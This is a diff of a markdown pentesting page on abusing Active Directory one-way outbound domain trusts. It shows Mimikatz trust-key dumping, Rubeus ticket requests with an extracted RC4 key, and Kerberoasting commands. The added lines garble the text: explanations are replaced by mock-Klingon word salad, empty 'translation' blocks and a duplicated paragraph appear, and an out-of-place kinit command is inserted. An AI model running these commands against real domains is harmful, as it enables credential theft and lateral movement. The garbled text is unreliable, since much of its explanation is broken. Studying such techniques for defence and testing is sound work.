@@ -19,7 +19,6 @@ In this scenario **your domain** is **trusting** some **privileges** to principa
 ## Enumeration
 
 ### Outbound Trust
-
 ```powershell
 # Notice Outbound trust
 Get-DomainTrust
@@ -41,39 +40,58 @@ MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
 MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
 ## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
 ```
-
 ## Trust Account Attack
 
-A security vulnerability exists when a trust relationship is established between two domains, identified here as domain **A** and domain **B**, where domain **B** extends its trust to domain **A**. In this setup, a special account is created in domain **A** for domain **B**, which plays a crucial role in the authentication process between the two domains. This account, associated with domain **B**, is utilized for encrypting tickets for accessing services across the domains. 
+A security vulnerability exists when a trust relationship is established between two domains, identified here as domain **A** and domain **B**, where domain **B** extends its trust to domain **A**. In this setup, a special account is created in domain **A** for domain **B**, which plays a crucial role in the authentication process between the two domains. This account, associated with domain **B**, is utilized for encrypting tickets for accessing services across the domains.
 
 The critical aspect to understand here is that the password and hash of this special account can be extracted from a Domain Controller in domain **A** using a command line tool. The command to perform this action is:
-
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
 ```
+**ghItlh:** QaStaHvIS **$** Daq **name** Hoch **account** 'e' **active** 'ej **"Domain Users"** **group** 'e' **A** **domain** vItlhutlh. vaj **permissions** 'e' **associated** 'ej **group** 'e' **inherit**. vaj **individuals** **authenticate** **A** **domain** **credentials** **account** 'e' **vItlhutlh**.
 
-This extraction is possible because the account, identified with a **$** after its name, is active and belongs to the "Domain Users" group of domain **A**, thereby inheriting permissions associated with this group. This allows individuals to authenticate against domain **A** using the credentials of this account.
+**chaw':** **A** **domain** **user** **limited permissions** **user** **A** **domain** **gain** **foothold** **leverage** **feasible** **situation**.
 
-**Warning:** It is feasible to leverage this situation to gain a foothold in domain **A** as a user, albeit with limited permissions. However, this access is sufficient to perform enumeration on domain **A**.
-
-In a scenario where `ext.local` is the trusting domain and `root.local` is the trusted domain, a user account named `EXT$` would be created within `root.local`. Through specific tools, it is possible to dump the Kerberos trust keys, revealing the credentials of `EXT$` in `root.local`. The command to achieve this is:
-
+`ext.local` **trusting domain** 'ej **root.local** **trusted domain** 'e'. **user account** **EXT$** **created** **root.local**. **specific tools** **through**, **Kerberos trust keys** **dump** **possible**, **credentials** **EXT$** **revealing** **root.local** **vItlhutlh**. **command** **achieve** **this** **is**:
 ```bash
 lsadump::trust /patch
 ```
+**Following this, one could use the extracted RC4 key to authenticate as `root.local\EXT$` within `root.local` using another tool command:**
 
-Following this, one could use the extracted RC4 key to authenticate as `root.local\EXT$` within `root.local` using another tool command:
+```
+command: kinit -k -t <path_to_keytab_file> EXT$
+```
 
+This command will authenticate the user `EXT$` using the extracted RC4 key and the keytab file.
 ```bash
 .\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
+```
+**Klingon Translation:**
+
+```
+### Authentication Step
+
+**tlhIngan Hol Translation:**
+
+**'Iw HIq authentication:**
+
 ```
 
 This authentication step opens up the possibility to enumerate and even exploit services within `root.local`, such as performing a Kerberoast attack to extract service account credentials using:
 
+```
+### Qapla' Authentication
+
+**tlhIngan Hol Translation:**
+
+**Qapla' 'Iw HIq authentication:**
+
+```
+
+This authentication step opens up the possibility to enumerate and even exploit services within `root.local`, such as performing a Kerberoast attack to extract service account credentials using:
 ```bash
 .\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
 ```
-
 ### Gathering cleartext trust password
 
 In the previous flow it was used the trust hash instead of the **clear text password** (that was also **dumped by mimikatz**).
